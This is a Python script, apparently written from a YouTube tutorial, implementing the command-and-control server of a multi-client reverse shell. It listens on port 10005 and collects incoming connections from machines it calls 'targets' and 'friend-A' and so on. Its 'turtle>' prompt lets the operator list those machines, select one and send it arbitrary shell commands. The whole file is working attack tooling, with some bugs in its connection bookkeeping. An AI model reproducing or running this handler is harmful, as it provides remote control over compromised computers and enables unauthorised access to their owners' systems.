#!/usr/bin/env python

#ref: https://www.youtube.com/watch?v=6jteAOmdsYg&list=PLhTjy8cBISErYuLZUvVOYsR1giva2payF

import socket
import sys

import threading
import time
from queue import Queue

NUMBERS_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []



# Create a socket (connet two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 10005
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error:" + str(msg))

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        
        print("Binding the port:" + str(port))

        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("Socket binding error:" + str(msg) + "\n" + "Retrying...")
        exit()
        #bind_socket()







# Handling connection from multiple cilents and saving to list
# Closing previous connections when server.py file is restarted

def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_addresses[:]


    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1) # prevents timeout

            all_connections.append(conn)
            all_addresses.append(address)

            print("connection has been established : " + address[0])

        except:
            print("ERROR accepting connection")


# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands
# ClientID, name
# 0 friend-A
# 1 friend-B
# 2 friend-C

# custom shell
def start_turtle():
    while True:
        cmd = input('turtle>')

        if cmd == 'list':
            list_connections()

        # TODO: add 'select all' feature   
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_command(conn)

        else:
            print("command not recognized")





# Display all current active connection with the clients

def list_connections():
    results = ''

    print("connection size: " + str(len(all_connections)))
    for i, conn in enumerate(all_connections):
        try:
            print("pinging " + str(i))
            conn.send(str.encode(' '))
            #conn.recv(201480)
        except:
            print("ping failed to user")
            del all_connections[i]
            del all_addresses[i]
            continue
        
        results = str(i) + "     " + str(all_addresses[i][0]) + "     " + str(all_addresses[i][1]) + "\n"

    print("---- Clients ----")
    print(results)




# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '') # target = id
        target = int(target) # cast to int
        conn = all_connections[target]
        print("you are now connected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + ">", end="") # format prompt

        return conn

        # 192.168.0.4>

    except:
        print("Selection not valid")
        return None







# Sends commands to client 
def send_target_command(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                #conn.close()
                #s.close()
                #sys.exit()
                break
            if len(str.encode(cmd)) > 0:
                #print(cmd)
                #hello_msg = "what's up??\n"
                #conn.sendall(hello_msg.encode())
                conn.sendall(str.encode(cmd+"\n"))
                #client_response = str(conn.recv(20480),"utf-8")
                #print(client_response, end="")
        except:
            print("Error sending commands")
            break



# Create worker threads
def create_workers():
    for _ in range(NUMBERS_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next jobs that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1: # handle connection
            create_socket()
            bind_socket()
            accepting_connection()
        if x == 2: # send commands - start shell
            start_turtle()

        queue.task_done()


# Create jobs
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()






create_workers()
create_jobs()


## Establish connection with client (socket must be listening)
#def socket_accept():
#    conn, address = s.accept()
#    print("Connection has been established! |" + " IP " + address[0] + " | Port " + str(address[1]))
#    hello_msg = "welcome client!\n"
#    conn.sendall(hello_msg.encode())
#    hello_msg = "what's up??\n"
#    conn.sendall(hello_msg.encode()) 
#    send_commands(conn)
#    conn.close()
#

#
#def main():
#    create_socket()
#    bind_socket()
#    socket_accept()
#
#main()
